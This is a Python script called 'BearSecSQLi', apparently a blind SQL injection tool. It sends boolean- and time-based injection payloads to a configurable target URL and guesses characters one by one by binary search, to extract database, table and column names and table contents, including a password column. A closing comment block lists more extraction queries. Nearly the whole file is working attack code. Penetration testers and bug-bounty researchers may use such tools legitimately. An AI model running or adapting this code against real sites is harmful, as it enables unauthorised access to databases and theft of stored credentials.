#!/usr/bin/env python3

import requests
import string
import sys
import urllib
import datetime
import time
import argparse

version = "BearSecSQLi v0.9"
req_type = "POST" #	GET	POST
use_proxy = False
proxy = {"http":"http://127.0.0.1:8080"}
cookies = {"session" : "session_cookie"}

delay = 1

space_replace = False #	True	False
space_symbol = "+" # "/**/"	"+"	"%09"	"%0A"	"%0B"	"%0C"	

urlencode = urllib.parse.quote
url = 'http://target.site'
word = ""

injection_databases	= "SELECT schema_name FROM information_schema.schemata"
injection_tables	= "SELECT table_name FROM information_schema.tables WHERE table_schema LIKE database()"		# Change DATABASE name
injection_columns	= "SELECT column_name FROM information_schema.columns WHERE table_name LIKE \'bugbounty\'"	# Change TABLE name
injection_data		= "SELECT passwd FROM bugbounty"

###	Error based
#originall_req = str("\"OR IF (ASCII(MID(($PLACE_INJECTION$ LIMIT $LC$,1),$MC$,1))>$CHAR$,true,false)-- -")

###	Time based
#originall_req = str("\"OR IF (ASCII(MID(($PLACE_INJECTION$ LIMIT $LC$,1),$MC$,1))=$CHAR$,sleep(5),0)-- -")

originall_req = str("\"OR IF(ASCII(MID(($PLACE_INJECTION$ LIMIT $LC$,1),$MC$,1))>$CHAR$,true,false)-- -")

#	ASCII all char list
allchar_list = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127]

#	ASCII printable list
printable_list = [32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126]

#	ASCII number list
number_list = [48,49,50,51,52,53,54,55,56,57]

def bs_logo():
	print()
	print("BearSec SQLi Binary guesser: " + version)
	print("  __         __  ")
	print(" /  \.-\"\"\"-./  \ ")
	print(" \    ~   ~    / ")
	print("  |   o   o   |  ")
	print("  \  .-'''-.  /  ")
	print("   '-\__Y__/-'   ")
	print("      `---`      ")
	print()

def char_search(char_search_inject, search_type):
	global word
	if (search_type == "count"):
		char_list = number_list
	else:
		char_list = printable_list # allchar_list
		
	low_number = 0
	high_number = len(char_list)
	char_flag = False
	request_flag = False
	
	while low_number <= high_number:
		try:
			mid_number = (high_number + low_number) // 2
			
			if ((high_number - low_number) < 2):
				modified_char_search_inject = char_search_inject.replace("$CHAR$",str(char_list[low_number]))
				char_flag = True
				print(word,chr(char_list[low_number]),sep='',end="\r")
			else:
				modified_char_search_inject = char_search_inject.replace("$CHAR$",str(char_list[mid_number]))
				print(word,chr(char_list[mid_number]),sep='',end="\r")
			
			request_flag = send_request(modified_char_search_inject)

#			print ("LOW:" + str(low_number) + " MID:" + str(mid_number) + " HIGH:" + str(high_number) + " CHAR:" + chr(char_list[mid_number]))

			if (char_flag == True):
				if (request_flag == True):	
					found_char = (chr(char_list[high_number]))
				else:
					found_char = (chr(char_list[low_number]))
				if (low_number == mid_number == 0):
					break
				else:
					word = word + found_char
					return found_char
			else:
				if (request_flag == True):
					low_number = mid_number + 1
				else:
					high_number = mid_number
		except KeyboardInterrupt:
			print("\nStop current searching")
			break
	return "\n\n"

def send_request(injection):
###		Request delay		
	time.sleep(delay)
	
	injection_flag = True
	if (injection_flag == True):
		print("\n\n!!! YOU FORGOT TO INSERT INJECTION !!!\n\n")
		sys.exit(-1)
	
	if (req_type == "POST"):	# Insert injection before HACK
		post_headers = {'Host': '8.8.8.8', 'User-Agent': version , 'Content-Type': 'application/x-www-form-urlencoded'}
		post_data = "login=admin&pass=1234"			# Post data
		if (use_proxy == True):
			try:
				r = requests.post(url, headers = post_headers, data = post_data, cookies = cookies, proxies = proxy)
				#r.raise_for_status()
			except Exception as e:
				print('\n\nRequest error: ' + str(e) + "\n")
				sys.exit(-1)
		else:
			try:
				r = requests.post(url, headers = post_headers, data = post_data, cookies = cookies)
				#r.raise_for_status()
			except Exception as e:
				print('\n\nRequest error: ' + str(e) + "\n")
				sys.exit(-1)
				
	if (req_type == "GET"):		# Insert injection before HACK
		get_headers = {'Host': '8.8.8.8', 'User-Agent': version}
		if (use_proxy == True):
			try:
				r = requests.get(url, headers = get_headers, cookies = cookies, proxies = proxy)
				#r.raise_for_status()
			except Exception as e:
				print('\n\nRequest error: ' + str(e) + "\n")
				sys.exit(-1)
		else:
			try:
				r = requests.get(url, headers=get_headers, cookies=cookies)
				#r.raise_for_status()
			except Exception as e:
				print('\n\nRequest error: ' + str(e) + "\n")
				sys.exit(-1)

###		Time based SQLi
#print (int(r.elapsed.total_seconds()))
#	if (int(r.elapsed.total_seconds()) > 4):
#		request_flag = True
#	else:
#		request_flag = False

###		Error based SQLi
#print ("r.len = " + str(len(r.content)))
	if (len(r.content) < 100):
		request_flag = True
	else:
		request_flag = False
	
	return request_flag

def check_count(check_count_req,arg_option):
	found_number = ""
	error_count = 0	
	
	if arg_option == "Count DBs":
		check_count_req = check_count_req.replace("$PLACE_INJECTION$", injection_databases).replace("schema_name","count(*)").replace("LIMIT $LC$,1","")
	elif arg_option == "Count Tables":
		check_count_req = check_count_req.replace("$PLACE_INJECTION$", injection_tables).replace("table_name","count(*)").replace("LIMIT $LC$,1","")
	elif arg_option == "Count Columns":
		check_count_req = check_count_req.replace("$PLACE_INJECTION$", injection_columns).replace("column_name","count(*)").replace("LIMIT $LC$,1","")

	if (space_replace == True):
		check_count_req = check_count_req.replace(" ", space_symbol)
		
	display_settings(check_count_req,arg_option)
		
	print ("*** " + arg_option + " ***")
	
	for MID_COUNT in range(1,3):			###		Range for MID should start from 1
	
		mid_check_count_req = check_count_req.replace("$MC$", str(MID_COUNT))
#		print (mid_check_count_req)
		get_number = str(char_search(mid_check_count_req,"count"))
		
		if (get_number != "\n\n"):
			found_number = found_number + get_number
			break
		else:
			if (found_number == ""):
				break
			else:
				error_count = error_count + 1
		if error_count == 2:
			break
			
	if (found_number != ""):					
		return found_number
	else:
		return False

def display_settings(inject_string, arg_option):

	print("*** Current Settings ***")
	print("URL:		" + url)
	print("Request type:	" + req_type)
	print("Request delay:	" + str(delay) + " sec.")
	if (use_proxy == True):
		print("Proxy:		" + str(proxy))
	else:
		print("Proxy:		" + str(use_proxy))
	if (space_replace == True):
		print("Space replace:	\"" + space_symbol + "\"")
	else:
		print("Space replace:	" + str(space_replace))
	print("Inject string:	" + inject_string)
	print("Current search:	" + arg_option)
	print("*** Current Settings ***")
	print()

def arg_checker():
	global use_proxy
	global proxy
	parser = argparse.ArgumentParser(description = "BearSec SQLi Binary searcher: " + version)
	group = parser.add_mutually_exclusive_group()
	group.add_argument("-d", action='store_true', help="Count Databases")
	group.add_argument("-t", action='store_true', help="Count Tables")
	group.add_argument("-c", action='store_true', help="Count Columns")
	group.add_argument("-D", action='store_true', help="Get DATABASE names")
	group.add_argument("-T", action='store_true', help="Get TABLE names")
	group.add_argument("-C", action='store_true', help="Get COLUMN names")
	
	parser.add_argument("-p", "--proxy", nargs='?',const="http://127.0.0.1:8080", help="Default proxy :" + str(proxy))
	
	args = parser.parse_args()

	if (args.proxy != None):
		use_proxy = True
		proxy = {"http": args.proxy}
		
	return args


def main():
	global word
		
	current_arg = arg_checker()
	if current_arg.d:
		arg_option = "Count DBs"
	elif current_arg.t:
		arg_option = "Count Tables"
	elif current_arg.c:
		arg_option = "Count Columns"
	elif current_arg.D:
		arg_option = "Database names"
	elif current_arg.T:
		arg_option = "Table names"
	elif current_arg.C:
		arg_option = "Column names"
	else:			
		arg_option = "Data from table"
	
	bs_logo()
	
	if ((arg_option == "Count DBs") or (arg_option == "Count Tables")  or (arg_option == "Count Columns")):
		start = datetime.datetime.now()
		count_result = check_count(originall_req, arg_option)
		if (count_result != False):
			print ("\n\n!!! " + arg_option + ": " + count_result + " found !!!\n")
		else:
			print ("!!! Count error !!!\n")
		end = datetime.datetime.now()
		print("Task time: ", end - start)
		print()
		sys.exit(-1)

	if arg_option == "Database names":
		originall_inject = originall_req.replace("$PLACE_INJECTION$", injection_databases)
	elif arg_option == "Table names":
		originall_inject = originall_req.replace("$PLACE_INJECTION$", injection_tables)
	elif arg_option == "Column names":
		originall_inject = originall_req.replace("$PLACE_INJECTION$", injection_columns)
	else:
		originall_inject = originall_req.replace("$PLACE_INJECTION$", injection_data)
	
	if (space_replace == True):
		originall_inject = originall_inject.replace(" ", space_symbol)
		
	display_settings(originall_inject, arg_option)
	
	print ("*** Start "+ arg_option +" searching ***\n")
	start = datetime.datetime.now()
	error_count = 0
	resultlist = []
	
	while True:
		for LIMIT_COUNT in range(0,50):				###		range for LIMIT should start from 0
			for MID_COUNT in range(1,50):			###		range for MID should start from 1
				modified_inject = originall_inject.replace("$LC$", str(LIMIT_COUNT)).replace("$MC$", str(MID_COUNT))

				get_char = str(char_search(modified_inject,"data"))
				
				if get_char == "\n\n":
					print(word," ")
					resultlist.append(word)
					error_count = error_count + 1
					word = ""
					break
				else:
					error_count = 0
					
			if error_count == 2:
				print("!Nothing more will be found!")
				
				end = datetime.datetime.now()
				print("Task time: ", end - start)
				print()
				
				print("Items we have found:")
				print("*****")
				indexval = 0
				for i in range(len(resultlist)):
					if (resultlist[indexval] != ""):
						print(str(indexval) + ". " + resultlist[indexval])
					indexval += 1
				print("*****")
				print()
				sys.exit(-1)

if __name__ == "__main__":
	main()
	

"""
#Get number of Databases
	SELECT count(*) FROM information_schema.schemata

#Get dabatase names
	SELECT schema_name FROM information_schema.schemata 

#Get database name char by char
	ASCII(substring((SELECT database()),$MC$,1))>$CHAR$

#Get number of Tables
	SELECT count(*) FROM information_schema.tables WHERE table_schema=DATABASE()

#Get table name
	SELECT table_name FROM information_schema.tables

#Get tablename char by char
	ASCII(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit $LC$,1),$MC$,1))>$CHAR$

#Get number of collums
	SELECT count(*) FROM information_schema.columns WHERE table_name=\'users\'

#Get collums name
	SELECT column_name FROM information_schema.columns WHERE table_name=\'users\'

#Get collums name char by char
	ASCII(substring((SELECT column_name FROM information_schema.columns WHERE table_name=\'users\' limit $LC$,1),$MC$,1))>$CHAR$

#Get contenet 
	SELECT name FROM users limit $LC$,1

#Get contenet char by char
	ASCII(substring((SELECT name FROM users limit $LC$,1),$MC$,1))>$CHAR$
"""
